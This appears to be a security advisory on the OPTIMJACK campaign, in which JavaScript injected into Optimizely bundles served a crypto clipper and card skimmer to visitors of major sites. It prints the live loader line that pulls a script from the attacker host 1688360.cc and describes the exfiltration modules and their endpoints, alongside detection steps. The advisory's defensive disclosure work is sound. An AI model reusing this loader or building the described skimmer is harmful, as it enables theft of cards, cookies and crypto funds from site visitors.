# CNN, Zoom, Fox News Served Visitors a Crypto-Stealing Skimmer – OPTIMJACK (Nov 2026)

Attacker JavaScript injected into Optimizely bundles swaps visitor crypto addresses and skims cards on 10+ sites. Chain, payload, IOCs.

## Summary

One poisoned tag layer, **15 household-name websites**, millions of exposed visitors. Attacker JavaScript injected into Optimizely bundles is serving a crypto-clipper + card-skimmer to visitors of **CNN, Zoom, Fox News, BBC, Salesforce, GitLab, American Eagle, Hootsuite** and seven more — plus side vectors through a first-party bundle, a Jscrambler-protected script, and one malvertising impression. If your site loads Optimizely, assume your visitors are in the blast radius until you check the bundle.

## Risk to a marketing and IT team

If your site loads Optimizely, your visitors are the targets: pasted wallet addresses get swapped before submission, card forms get skimmed, and page URLs plus cookies plus a screenshot leave with every hit. Your origin can be clean while your visitors are robbed — the compromise sits in the tag layer. Three-step check: (1) fetch your served Optimizely bundle and search it for `1688360`; (2) alert on Content-Security-Policy `script-src` violations naming unknown hosts; (3) verify with a test wallet address on a staging page that what you paste is what gets submitted.

## The loader

Inside affected Optimizely bundles, directly after the normal experiment code:

```
<script src="https://cdn.optimizely.com/js/5113954737848320.js"
  class="optanon-category-C0002"></script>
```
and inside that bundle:

```
(function(){try{var s=document.createElement('script');
s.src='https://1688360.cc/track.js';s.async=true;
(document.head||document.documentElement).appendChild(s);}catch(e)})();
```
That project ID is GitLab’s; ten more project/snippet IDs across unrelated organisations carry the same line. Two affected sites instead blocked it with CSP (`script-src` violation, request Failed) — compromised snippet, unexecuted payload.

## The payload

One self-contained script, four modules:

**1. Clipper.** Regex plus real checksum validation (double-SHA256, base58check, bech32, cashaddr, TON CRC16) for ETH, TON (friendly + raw), BTC, BCH, LTC, TRX, DOGE and SOL. Rewrites DOM text (50 ms sweep, payment-keyword gated), `input`/`textarea` values (including framework models), link/image `src`/`href`, `copy` events, `clipboard.writeText/readText`, `navigator.share`, and `fetch`/`XHR` URLs and bodies. Every swapped original is queued for exfil.

**2. Screenshot + cookie exfil.** Posts page URL (≤500 chars), cookies (≤8,000), a JPEG screenshot via `html2canvas` pulled from the same C2, and the matched original addresses to `/hit.php`.

**3. Card skimmer.** Luhn plus brand check, `MM/YY` + 3–4-digit CVV validation, hooks `fetch`/`XHR` POST bodies (JSON, `FormData`, nested objects) and form submits, dedupes per session, exfiltrates via `sendBeacon` to `/card.php`.

**4. iOS second stage.** On iPhone/iPad/iPod only: injects `boot.js` from two `.icu` hosts and, on iOS ≤ 18.6, a hidden iframe. The recovered `boot.js` is obfuscated and under analysis.

## Detection

- Search served tag-manager bundles for unknown `.cc`/`.icu` hosts — catches this loader; misses loader variants on fresh domains.
- CSP `script-src` violation monitoring — two sites survived this way; misses pages without CSP or with permissive policies.
- Client-side: alert on `html2canvas` fetched from a non-site host, `sendBeacon` to unknown hosts on checkout pages — catches the exfil leg; misses passive skimmers that only read.
- Canary wallet address in staging: paste, submit, compare — catches clipper; misses keyword-gated payloads that ignore test pages.
